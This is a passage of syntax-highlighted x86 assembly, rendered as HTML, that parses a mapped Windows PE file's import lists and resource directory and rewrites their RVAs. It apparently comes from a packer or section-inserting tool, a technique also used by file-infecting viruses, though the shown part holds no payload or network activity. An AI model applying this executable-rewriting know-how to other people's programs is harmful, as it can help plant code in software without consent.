       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">               </span><span class="sc1">;import by ordinal?</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@next_item</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">@@next_item</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@next_item</span><span class="sc0">

  </span><span class="sc5">@@done</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RVA4LIST</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc5">DO_LIST</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;+fmap</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@@empty_table</span><span class="sc0">
  </span><span class="sc5">@@next_function</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next_function</span><span class="sc0">
  </span><span class="sc5">@@empty_table</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DO_LIST</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc5">ProcessResource</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Resource</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0"> </span><span class="sc5">found</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">processing</span><span class="sc0"> </span><span class="sc5">resource</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc4">(%</span><span class="sc5">X</span><span class="sc0"> </span><span class="sc5">entries</span><span class="sc4">)&gt;,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@cycle_directory</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@resource_directory</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">resource</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@next_resource_item</span><span class="sc0">
  </span><span class="sc5">@@resource_directory</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7fffffffh</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">resource</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ProcessResource</span><span class="sc0">
  </span><span class="sc5">@@next_resource_item</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@cycle_directory</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ProcessResource</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span></div></body>
</html>
